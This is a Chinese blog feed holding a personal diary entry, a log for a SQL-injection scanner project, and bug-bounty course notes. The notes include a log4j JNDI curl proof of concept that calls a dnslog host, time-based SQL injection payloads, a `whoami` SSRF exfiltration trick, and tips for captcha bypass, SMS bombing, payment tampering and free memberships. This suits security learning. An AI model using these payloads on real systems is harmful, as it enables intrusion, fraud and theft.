    <content type="html"><![CDATA[<p><img src="/images/Elaina_58.png" alt="Elaina"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好长一段时间没写日志了，这是为什么呢？我想，恐怕就如一位长期不联系的朋友，“默契”地消失了吧。<br>不过我还是打算写，我想记录，铭刻一些感想。<br>许久未写，所以会有点长吧。</p><h1 id="偶像"><a href="#偶像" class="headerlink" title="偶像"></a>偶像</h1><p>其实我不怎么喜欢“偶像”这个词，因为这么说好像无脑崇拜一样。不过我也确实找不到一个更恰当的词了。<br>很多时候，我们喜欢或羡慕一个人，是因为这个人拥有我们所不具备的特质。而能够与一个人长久和睦相处，又是因为彼此之间拥有许多共同点。</p><p>在活着的人里，目前唯一能让我五体投地的人也就只有Elon Musk了。<br>那么我为此做了什么呢？听了他大大小小的访谈、演讲甚至听证会；看完了一本厚厚的书–艾萨克森所写的马斯克传，甚至读这本书的原版英文籍此学英语；去年买了几个月的X&#x2F;Twitter上Elon账号的会员（虽然基本没有任何会员内容就是了）。还有很多，不一一列举。<br>对于其他人我可能都没有这么做过吧。</p><p>那么，为什么他这么让我敬佩呢？我想主要有3点：所作所为，思想，性格。</p><p>首先从所作所为说起吧，这一部分的详细了解主要是在传记中，我认为这本传记还算不错的，文笔不错，视角客观，有详有略能让人看到一个立体的Elon，在书中详细记述了马斯克的大大小小事例，可以看出他的确作出了艰苦的奋斗（即便是天天叫苦不迭的996、007打工人也比不过他），也不是依靠家族的援助（曾经长期居于世界首富的比尔盖茨被人指出是因为有优渥的家庭才能成功）。<br>从这一点而言，可以说马斯克白手起家也不过分（有人指出家里的父亲母亲给了他几万美元创业，但他们不知道的是，家里虽然给了几万美元，但Elon弄丢了很大一部分…）。也就是说，Elon基本上可以算是白手起家的完美模板，没有人比他更成功，也没有人比他最初拥有的财富翻了更多倍。<br>除了勤奋到疯狂的地步以外，马斯克还是一个真正意义上的冒险家。在最初两次互联网创业成功后，他并没有选择安然享乐，而是投身到SpaceX和Tesla的漩涡中。在两个风险极高的创业项目中，他选择迎难而上。最终战胜了所有，取得了一切荣耀。</p><p>然后是思想。这也许对我来说是最重要的一点，如果仅仅只是所作所为亮眼，那么我可能只是抱有敬佩的态度而不至于推崇至此。这一部分的详细了解主要是从各种访谈演讲和传记中得知。<br>最广为人知的恐怕就是他所推崇的第一性原理和五步工作法。这些都是非常有用的东西。第一性原理可以运用到方方面面，让我真真正正理解了为什么不要和他人比较，不要用比较的思维去看待事物。比如，一次考试满分是100，那么就应当关注100分，而不是关注排在自己前面或后面的名次是多少分，这样就是在给自己设限，那么能达到的高度也就仅此而已了。<br>但是Elon的思想不仅仅这些，他还有非常多关于各个方面的思想。马斯克传上写的可以看另一篇摘抄文章，这里主要说说访谈中讲到的一些思想，因为看访谈也没做笔记可能有些忘记了。比如不要害怕受到他人的批评，不要害怕失败，只需要快速建立反馈回路，错了改进就好；媒体新闻不代表真实；人类太长寿命会导致社会僵化；多看书多实践；人口崩溃问题等等。<br>写一句近期比较震撼我的话：<br>I’m saying what I care about is the reality of goodness, not the perception of it.<br>我关心的是良善的落实，而不是表达的善意。</p><p>最后是性格吧，狂放不羁而又粗中有细。喜欢看书，玩游戏。我有些与他相似的地方，有些也不如他透彻。痛苦是常有的，但痛苦是值得的。</p><h1 id="评分"><a href="#评分" class="headerlink" title="评分"></a>评分</h1><p>最近对评分的看法有些改变，以前我挺在意评分，比如要看一部动漫，我可能会先去看它的评分多少，然后再决定看不看。还有就是有时看完了一部作品，我会去看各大排行榜的评分评价，如果我认为不客观，我就会认为有失公允，我曾会建立一套自己的评分体系，想要达到一种我个人认为上的最客观标准。</p><p>现在不是这样了，我已经没有那么像以前那样在意评分了。当然这不是说我已经可以抛开评分任意选择，很多时候还是看看评分评价，确认其中是否有我所不能接受的要素。而现在我得说，一个东西在我了解了之后，比如作品看完后，餐馆吃过了之后，它原有的在各大平台上的评分对我来说就不重要了。唯一重要的只有我自己的评价。</p><p>原因有几个：</p><ol><li>了解深浅导致的评分不同。以动漫为例，假如看了一部动漫，那么初看动漫、看了一段时间动漫和常年看动漫的人评价会一样吗？我想大概率不会，因为一个东西接触时间的长短会导致了解程度的深浅不同，进而导致评价体系有所不同。初看动漫的人可能觉得画面好剧情好就够了，而有一定水准的人可能认为还需要看分镜，看演出，看配乐，看画风等等。另一个例子就是Steam上的游戏，有些比如只狼，荒野大镖客2和埃尔登法环这些都做得很好，但是他们不一定能拿到最高的好评率，原因就在于当一款游戏火了之后，来玩这款游戏的人并不一定都是了解这款游戏类型背景的人，他们可能会因游戏难度，操作手法等因素打出差评，因为他们不理解不适应。</li><li>从众现象导致的评分不同。有些时候一开始某个东西好或不好还是在比较理性的层面，但有时某个有影响力的人先站出来说这个东西好或不好，那么大众的舆论风向就会跟着一边倒。因为大众很多时候并不会去思考，他们迷信权威迎合主流看法而放弃了自我思考的能力。因此我认为一个真正会独立思考的人是敢于与大众风向不同带出自己观点看法的人，而不是人云亦云做他人看法的复读机或捧着谁的说法当作圣经一样。这里也并不是说引用谁的说法就不正确了，而是要确信这个说法是真正理解后认同的，而不单纯是转述。</li><li>评分不需要他人认同。很多时候我们觉得一个评分高了或低了，是因为我们想要让自己的偏好获得他人的认同，这是不对的。因为人永远不可能让所有人的喜好和自己相同，也正是不同才有如此的多样性。理解他人并坚持自我即可。</li></ol><h1 id="漫画感想"><a href="#漫画感想" class="headerlink" title="漫画感想"></a>漫画感想</h1><p>前段时间写了很多漫画感想，有一部分原因是为了获得moeshare论坛（漫画分享论坛）上的积分，也有部分是自己想写。<br>不过太花时间了，写一篇一般要1.5-2.5小时。借力打力是个好办法，明面上是为了获取积分，其实是想推动自己写出来。</p><h1 id="故事"><a href="#故事" class="headerlink" title="故事"></a>故事</h1><p>我其实本质上喜欢的是故事。无论小说，漫画，动画其实都是载体。</p><h1 id="温柔与软弱"><a href="#温柔与软弱" class="headerlink" title="温柔与软弱"></a>温柔与软弱</h1><p>不要因为他人的温柔，而让自己变得软弱。</p><h1 id="中等好人"><a href="#中等好人" class="headerlink" title="中等好人"></a>中等好人</h1><p>最近爱泼斯坦萝莉岛事件的文书释出，让众人议论纷纷，能够以道德制高点评判那些富豪与权势者也是让众人兴奋不已。<br>在我看来这不过是一种阿Q的精神胜利法罢了。<br>不如这些有权有财的一般人，平时面对比他们地位高或财富多的人都是抬不起头的，唯有这种时候才能在唯一的道德方面嘲讽他们。但我并不认为这些普通人比有权有财的人好到哪里去，他们不过是没有那样的机会罢了。其实就那样，因为自己做不到，所以嘲讽那些能做并且做到的人，这样就能让他们内心更加愉悦，也只有这种时候才让他们觉得自己踩在了富豪权势者头上，也只有这种时候才能尽情抒发自己的嫉妒恨的心理。<br>之前看过一个节目里的一句话，大概说的是网民很多时候在网上寻找两样东西：廉价的崇高感，合法的伤害权。我并不完全同意这句话，我的看法是大多数人在闲暇时间都只是寻欢作乐罢了。毕竟能够在不违法的前提下伤害他人往往也是一种快乐（比如辱骂嘲讽）。</p><p>综上，我想表达的是不必评价某人如何如何，如果喜欢他那么继续喜欢，如果讨厌他就远离，如果还想关注又不同意他的某些行为或观点，那么提出意见或建议即可。</p><h1 id="最大效益"><a href="#最大效益" class="headerlink" title="最大效益"></a>最大效益</h1><p>冷静与炽热的结合：冷静让分析准确，炽热让动力强大。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/Elaina_58.png&quot; alt=&quot;Elaina&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>基于Python的漏洞扫描器实现过程</title>
    <link href="http://example.com/2024/01/06/%E5%9F%BA%E4%BA%8EPython%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
    <id>http://example.com/2024/01/06/%E5%9F%BA%E4%BA%8EPython%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
    <published>2024-01-05T16:00:00.000Z</published>
    <updated>2024-01-06T14:53:35.239Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次做这种项目。慢慢实现中。</p><span id="more"></span><h1 id="SQL注入–Scan"><a href="#SQL注入–Scan" class="headerlink" title="SQL注入–Scan"></a>SQL注入–Scan</h1><p>首先需要获取并检测链接，由用户手动输入，形如 <code>https://example.com?id=</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="built_in">input</span>(“Please <span class="built_in">input</span> URL:”)   <span class="comment"># 示例代码</span></span><br></pre></td></tr></table></figure><p>检测链接是否为一个正常的url，首先检测用户是否输入正常，可以使用正则表达式。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_url</span>(<span class="params">url</span>):</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;^(http|https)://[a-zA-Z0-9-._~:/?#[\]@!$&amp;\&#x27;()*+,;=]+$&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bool</span>(pattern.<span class="keyword">match</span>(url))</span><br><span class="line"></span><br><span class="line">user_input = <span class="built_in">input</span>(<span class="string">&quot;请输入一个链接: &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> is_valid_url(user_input):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入的是一个有效的链接! &quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入的不是一个有效的链接! &quot;</span>)</span><br></pre></td></tr></table></figure><p>再检测链接是否有效，可以使用python的requests库来发送一个HEAD请求来检测链接。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_url</span>(<span class="params">url</span>):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.google.com&#x27;</span>,  <span class="comment"># 替换为实际的Referer</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> requests.Session() <span class="keyword">as</span> session:</span><br><span class="line">            response = session.get(url, headers=headers, allow_redirects=<span class="literal">True</span>)</span><br><span class="line">            response.raise_for_status()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 打印请求和响应内容，以便调试</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Request: <span class="subst">&#123;response.request&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Response: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;请求发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example usage</span></span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&quot;input: &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> is_valid_url(url):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span> 是一个正常的URL&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span> 不是一个正常的URL&quot;</span>)</span><br></pre></td></tr></table></figure><p>需要伪装成浏览器发送请求，伪造User-Agent，Referer等等。<br>对不同数据库编写不同的测试payload，<br>然后判断GET请求还是POST请求，如果是GET请求就只对url参数测试，如果是POST请求就对url参数和post请求的内容测试，然后再对UA，Referer和Cookie进行测试。<br>如果有某类数据库特征出现（如错误信息，特定的数据库函数，指纹等），那么根据特征返回数据库类型。<br>如果过程中出现了报错信息或延时情况，那么返回SQL注入类型，并告知存在SQL注入。<br>数据库类型只有在出现SQL注入漏洞才返回。</p><pre><code>        判断GET/POST</code></pre><p>↓↓<br>GET POST<br>↓↓<br>测试GET&#x2F;UA&#x2F;Referer&#x2F;Cookie 测试GET&#x2F;POST&#x2F;UA&#x2F;Referer&#x2F;Cookie<br>                          ↓<br>                报错注入&#x2F;延时注入挨个测试<br>                ↓↓<br>                有 无<br>                ↓↓<br>返回数据库类型，注入点，注入类型返回无</p><p><strong>代码内容见chatGPT</strong></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;第一次做这种项目。慢慢实现中。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞扫描器" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    
    
    <category term="漏洞扫描器" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>SRC_cource_16</title>
    <link href="http://example.com/2023/12/24/SRC_cource_16/"/>
    <id>http://example.com/2023/12/24/SRC_cource_16/</id>
    <published>2023-12-23T16:00:00.000Z</published>
    <updated>2024-01-04T03:59:44.573Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2023漏洞新课</p><span id="more"></span><h1 id="SRC漏洞挖掘类型"><a href="#SRC漏洞挖掘类型" class="headerlink" title="SRC漏洞挖掘类型"></a>SRC漏洞挖掘类型</h1><p>移动安全漏洞，IOT漏洞，web安全漏洞（常规漏洞挖掘，逻辑漏洞挖掘，nday漏洞利用），隐私合规，威胁情报，二进制漏洞。</p><p>众测平台：补天众测，漏洞盒子，雷神众测，火线，360众测</p><p>企业SRC：阿里SRC，腾讯SRC，百度SRC，字节SRC，快手SRC，丁香园SRC，联想SRC</p><h1 id="burp插件"><a href="#burp插件" class="headerlink" title="burp插件"></a>burp插件</h1><ol><li>验证码识别</li><li>APIKit</li><li>Authz</li><li>Autorize</li><li>BSPE</li><li>BurpBountyPlus</li><li>BurpExtender</li><li>BurpFakeIP</li><li>Chunked coding converter</li><li>DataExtractor</li><li>Domain Hunter</li><li>FastJson</li><li>FastjsonScan</li><li>Fiora</li><li>HaE</li><li>HTTP Request Smuggler</li><li>HttpHeadmodfer</li><li>J2EEScan</li><li>JSON Web Tokens</li><li>JSONP-Hunter</li><li>knife</li><li>log4j</li><li>log4j-2</li><li>Passive Scan Client</li><li>reflector</li><li>shiro</li><li>software-vulnerability-scanner</li><li>sqlmap4burp-plus-plus</li><li>Struts2-RCE</li><li>Unexpected_information</li><li>wooyun-payload</li></ol><h1 id="越权绕过小技巧"><a href="#越权绕过小技巧" class="headerlink" title="越权绕过小技巧 /"></a>越权绕过小技巧 <code>/</code></h1><p>场景： <code>/rest/manage</code> 系列的接口不能被普通用户访问<br>在url处加&#x2F;绕过: <code>https://xx.com/manage//ad</code></p><h1 id="子主账号越权"><a href="#子主账号越权" class="headerlink" title="子主账号越权"></a>子主账号越权</h1><p>主账号点击编辑，抓包 <code>/gw/kdb/scpfour/GroupBuySearchService/queryFoodProductByProductId</code><br>抓包子账号，保留cookie，替换cookie，并且重放数据包，发现依旧能够获取到相同的数据</p><p>即可证明子账号能够越权访问优惠套餐数据</p><h1 id="提交漏洞选择编辑器还是附件"><a href="#提交漏洞选择编辑器还是附件" class="headerlink" title="提交漏洞选择编辑器还是附件"></a>提交漏洞选择编辑器还是附件</h1><p>XSRC模板系列的SRC建议直接附件提交，因为难用。在编辑器中提醒审核见附件。</p><p>其它的建议在编辑器写，必须在编辑器写的是ASRC，不要附件。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;2023漏洞新课&lt;/p&gt;</summary>
    
    
    
    <category term="SRC" scheme="http://example.com/categories/SRC/"/>
    
    
    <category term="SRC" scheme="http://example.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>SRC_cource_14</title>
    <link href="http://example.com/2023/12/22/SRC_cource_14/"/>
    <id>http://example.com/2023/12/22/SRC_cource_14/</id>
    <published>2023-12-21T16:00:00.000Z</published>
    <updated>2023-12-22T15:03:18.694Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>课程内部月度分享。SRC内容补充，其它关于护网逆向的内容就再看一遍课好了。</p><span id="more"></span><h1 id="常见的ueditor"><a href="#常见的ueditor" class="headerlink" title="常见的ueditor"></a>常见的ueditor</h1><p>常见目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/ueditorutf8</span><br><span class="line">/ueditor</span><br><span class="line">/static/ueditor</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.xxx.com/ueditorutf8/net/controller.ashx?action=config</span><br><span class="line">https://www.xxx.com/ueditorutf8/net/controller.ashx?action=catchimage</span><br><span class="line">参考url：https://www.cnblogs.com/hei-zi/p/13394764.html</span><br></pre></td></tr></table></figure><h1 id="VmwareHorizonClient-log4j"><a href="#VmwareHorizonClient-log4j" class="headerlink" title="VmwareHorizonClient log4j"></a>VmwareHorizonClient log4j</h1><p>POC:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -vv -H &quot;Accept-Language: \$&#123;jndl:ldap://j9qf9g.dnslog.cn:1207/lol&#125;&quot; --insecure https://xx.com</span><br></pre></td></tr></table></figure><p>查看dnslog有无回显，有回显则说明存在漏洞</p><h1 id="cas认证"><a href="#cas认证" class="headerlink" title="cas认证"></a>cas认证</h1><p>比如一些swaggerUI的接口，在swaggerUI中发包，返回无法获取<br>或者一些在Findsomething中找到一些接口，访问发现未经认证<br>就可以找认证服务，如sso和cas<br>其中cas可以爆破<br>Authorization: Basic base64<br>可以使用burp进行爆破<br>4版本可以rce</p><p>SSO平台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/public/pages/login/index.html?backurl=http://xxx.com/Account/Login/ReturnUrl=/&amp;app=test</span><br><span class="line">替换为</span><br><span class="line">http://xxx.com/public/pages/login/index.html?backurl=http://替换.com/Account/Login/ReturnUrl=/&amp;app=test</span><br></pre></td></tr></table></figure><h1 id="美团虚拟地址白嫖会员"><a href="#美团虚拟地址白嫖会员" class="headerlink" title="美团虚拟地址白嫖会员"></a>美团虚拟地址白嫖会员</h1><p>用虚拟地址更改定位。</p><h1 id="安卓客户端漏洞"><a href="#安卓客户端漏洞" class="headerlink" title="安卓客户端漏洞"></a>安卓客户端漏洞</h1><ol><li><p>使用drozer对 xx app Android版进行扫描，执行以下命令，获取APP导出组件<br><code>run app.activity.info -a ddns.android.vuls</code></p></li><li><p>通过分析，发现调用相机功能的组件 <code>com.xx.xx.xx.CameraActivity</code> 被导出<br>执行以下命令可直接调用相机权限，打开相机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component com.xx.xx</span><br><span class="line">com.xx.xx.xx.CameraActivity</span><br></pre></td></tr></table></figure><p>…后续省略，详见课程</p></li></ol><p>原理：不具备某一权限的恶意app，通过调用第三方app（该app含有某权限漏洞），进行权限申请操作。实现从无权限到有权限的过程。</p><p>开源安卓APP漏洞案例详情<br><code>https://securitylab.github.com/advisories/GHSL-2021-1033_Nextcloud_News_for_Android</code></p><h2 id="APP渗透测试比web多的部分"><a href="#APP渗透测试比web多的部分" class="headerlink" title="APP渗透测试比web多的部分"></a>APP渗透测试比web多的部分</h2><ol><li><p>环境检测对抗<br>magisk + lsposed<br><code>https://mp.weixin.qq.com/s/oQau4pqXUfn2Wryo7vXGRQ</code><br>(建议使用真手机测试，二手买一个)</p></li><li><p>抓包对抗（代理检测型）<br><code>https://mp.weixin.qq.com/s/DoCxqBTIGWzFR9eETOLzJQ</code><br>代理工具：iptables, proxifier, postern, stream<br>不走代理（通过代码逻辑实现）</p></li></ol><p>安卓7.0以下，直接导入burp证书是安装在用户目录，被信任。<br>安卓7.0以上，证书默认不被信任。解决方法：将证书移动到系统根目录。</p><p>绕过方式：<br>单向证书校验：justtrustme（基于lsposed）, frida脚本<br>双向证书校验：r0caputre, hooker, 定制rom，直接反编译源码</p><p>body乱码 –&gt; gzip –&gt;基于hook抓包 –&gt; frida</p><ol start="3"><li>加解密对抗<br>frida –&gt; r0tracer, objection<br>xposed –&gt; lnspeckage<br>直接逆向获取源码 –&gt; 脱壳</li></ol><h1 id="登录接口的暴力破解"><a href="#登录接口的暴力破解" class="headerlink" title="登录接口的暴力破解"></a>登录接口的暴力破解</h1><p>描述：登录接口用户名和密码都进行了加密处理，经过测试发现没有进行次数限制和验证码处理逻辑，因此这里有暴力破解漏洞。<br>加密算法：通过前端JS进行分析得出为：DES Pkcs7 加密算法<br>牛刀：实现DES加密的算法，对字典进行加密，使用密文进行批量枚举</p><h1 id="订单越权-amp-邮件地址IDOR"><a href="#订单越权-amp-邮件地址IDOR" class="headerlink" title="订单越权&amp;邮件地址IDOR"></a>订单越权&amp;邮件地址IDOR</h1><p>描述：好多业务都有报告导出的功能<br>POST请求的数据包体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Orderid=123&amp;Type=.pdf&amp;DownType=email&amp;Email=xxx@xxx.com</span><br></pre></td></tr></table></figure><p>正常逻辑：订单号对应到具体的人，这个人后台设置了绑定的邮箱，因此只能推送到该用户的邮箱才对，也即订单号&amp;邮箱地址绑定的逻辑。</p><p>漏洞：未校验orderid，绑定关系</p><h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h1><p>描述：漏洞存在于订单预览的页面，请求如下：<br><code>https://app.example.com/OrderDialog/DataEntry?orderId=2004140011&amp;IsShanghaiVolkswagen=0&amp;type=view</code><br>一般这种请求就分析：订单号枚举越权&amp;SQL注入漏洞<br>payloads:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&quot; or sleep(5)=&quot;</span><br><span class="line">&#x27; or sleep(5)=&#x27;</span><br><span class="line">1) or sleep(5)#</span><br><span class="line">&quot;) or sleep(5)&quot;</span><br><span class="line">&#x27;) or sleep(5)&#x27;</span><br><span class="line">1)) or sleep(5)#</span><br><span class="line">&quot;)) or sleep(5)=&quot;</span><br><span class="line">&#x27;)) or sleep(5)=&#x27;</span><br><span class="line">;waitfor delay &#x27;0:0:5&#x27;--</span><br><span class="line">);waitfor delay &#x27;0:0:5&#x27;--</span><br></pre></td></tr></table></figure><p>sqlmap跑</p><h1 id="加密算法bypass"><a href="#加密算法bypass" class="headerlink" title="加密算法bypass"></a>加密算法bypass</h1><p>描述：订单预览的界面，发现订单号加密了，其加密算法为对称加密，无法获取密钥，也就无法解密。<br>请求：<br><code>https://app.example.com/DataEntry/OrderView?orderId=QUdjalfaljDSAFOjwdoiad</code></p><p>经过分析请求数据包发现加密接口<br><code>https://sapp.example.com/Common/EncryptText?text=2004140008</code></p><p>推测：该功能应该是为了防止通过订单号枚举越权访问而采用的安全措施。</p><h1 id="Js-map文件到越权漏洞"><a href="#Js-map文件到越权漏洞" class="headerlink" title="Js.map文件到越权漏洞"></a>Js.map文件到越权漏洞</h1><p>描述：后端程序对请求包体进行了签名校验，因此更改任何数据包都会导致签名校验失败</p><p>webpack打包：<code>https://app.example.com/app.js.map</code><br>源代码还原： <code># reverse-sourcemap --output-dir test app.js.map</code></p><h1 id="验证码绕过到任意-手机-x2F-邮箱轰炸"><a href="#验证码绕过到任意-手机-x2F-邮箱轰炸" class="headerlink" title="验证码绕过到任意-手机&#x2F;邮箱轰炸"></a>验证码绕过到任意-手机&#x2F;邮箱轰炸</h1><p>描述：每次触发验证码都触发图形验证码逻辑</p><p>删除头部的 <code>&quot;x&quot;:114</code> 元素即可批量发送</p><h1 id="信息泄露到OSS-Bucket接管"><a href="#信息泄露到OSS-Bucket接管" class="headerlink" title="信息泄露到OSS Bucket接管"></a>信息泄露到OSS Bucket接管</h1><p>描述：请求包返回加密的云凭证信息</p><h1 id="不一样的任意用户"><a href="#不一样的任意用户" class="headerlink" title="不一样的任意用户"></a>不一样的任意用户</h1><p>描述：用户注册，用户登录验证码本地回显[adb logcat 抓取触发验证码]</p><p>破解方法：验证码发到app里，在burp中无法抓包</p><h1 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h1><p>小程序抓包，购买参数，将数量改为小数，总价变少</p><h1 id="SSRF-RCE"><a href="#SSRF-RCE" class="headerlink" title="SSRF+RCE"></a>SSRF+RCE</h1><p>利用技巧： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com?url=http://`whoami`.teibgj.dnslog.cn</span><br></pre></td></tr></table></figure><p>先执行 <code>whoami</code> 命令，再执行ping命令，优先级前者高。</p><h1 id="二次注入绕过"><a href="#二次注入绕过" class="headerlink" title="二次注入绕过"></a>二次注入绕过</h1><p>在用户名或手机号后加空格，即使账号存在重名也可能能注册成功。<br>示例：<br>账号： <code>admin </code><br>手机号： <code>15300000000 </code></p><h1 id="更改文件类型解析"><a href="#更改文件类型解析" class="headerlink" title="更改文件类型解析"></a>更改文件类型解析</h1><p>场景：原本只允许解析pdf文件<br>修改：将文件内容和后缀改为html</p><h1 id="微信小程序反编译"><a href="#微信小程序反编译" class="headerlink" title="微信小程序反编译"></a>微信小程序反编译</h1><p>首先找到微信小程序，在 设置-文件管理 找到小程序文件。<br>解密工具：</p><ol><li>使用 PC微信小程序一键解密 By:代码果 工具</li><li>wxapkgconvertor</li><li>小锦哥小程序工具（全部集成）</li></ol><h1 id="众测项目"><a href="#众测项目" class="headerlink" title="众测项目"></a>众测项目</h1><h2 id="众测项目特点"><a href="#众测项目特点" class="headerlink" title="众测项目特点"></a>众测项目特点</h2><ol><li>项目周期短 - 基本为3-30天</li><li>奖金相对丰厚 - 最低标准（低危100，中危500，高危1000）</li><li>项目难度低，资产多（基础漏洞多）</li><li>竞争激烈 - 大项目基本上为多家竞测</li><li>金融项目较多，国有银行+股份制银行+城商、农商行+各大证券</li></ol><h2 id="项目分类"><a href="#项目分类" class="headerlink" title="项目分类"></a>项目分类</h2><ol><li>有测试范围的众测 - 从测试范围找脆弱资产</li><li>全互联网资产的众测 - 外包系统-&gt;小程序-&gt;公众号-&gt;主域名系统-&gt;APP</li><li>红队项目众测 - 不建议投入大量精力</li><li>每个月都有的特定目标众测 - 不建议参加</li></ol><h2 id="寻找外包系统"><a href="#寻找外包系统" class="headerlink" 